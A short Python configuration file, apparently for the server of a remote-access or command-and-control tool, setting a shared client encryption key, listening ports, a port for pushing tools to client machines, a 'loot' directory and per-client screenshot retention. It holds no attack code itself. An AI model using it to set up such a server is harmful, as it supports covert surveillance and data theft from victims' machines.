# --- Encryption settings --- #
USE_ENCRYPTION = True
ENCRYPTION_KEY = "FfmExgn4kwEc8uxueSOaLsoKYCM1DpQ2GSe6xSdOIfA="  # openssl rand -base64 32
                                                                 # Must be the same as client's

# --- Server settings --- #
LISTEN_ALL = "0.0.0.0"
LISTENING_PORT = 43558
HTTP_PORT = 26954  # To download tools on client machine
SOCKET_TIMEOUT = 5  # Connection timeout in seconds
BUFFER_SIZE = 65536  # Data reception buffer size
                     # 64KB is an ideal balance for most systems

# --- Storage settings --- #
LOOT_DIR = "loot"
MAX_SCREENSHOTS_PER_CLIENT = 1000  # With a screenshot every minute,
                                   # that makes 1000 minutes (~16hrs)
SCREENSHOT_RETENTION_DAYS = 7
MAX_SCREENSHOT_DIR_SIZE_MB = 512

# --- Logging settings --- #
LOG_LEVEL = "SUCCESS"  # Only show logs equal and above the chosen level. Possible options are:
                       # "DEBUG", "INFO", "SUCCESS", "WARNING", "ERROR"
                       # Ex.: "SUCCESS" will only show SUCCESS logs and above, so WARNING and ERROR
SILENT_MODULES = []  # Choose which logs to silence based on modules. Possible options are:
                     # "receiver", "filesystem", "management", "decryption" or "upload"
                     # Ex.: ["filesystem", "decryption"] will silence all logs about filesystem and decryption
LOG_COLORS = True  # Enable colored terminal output when supported
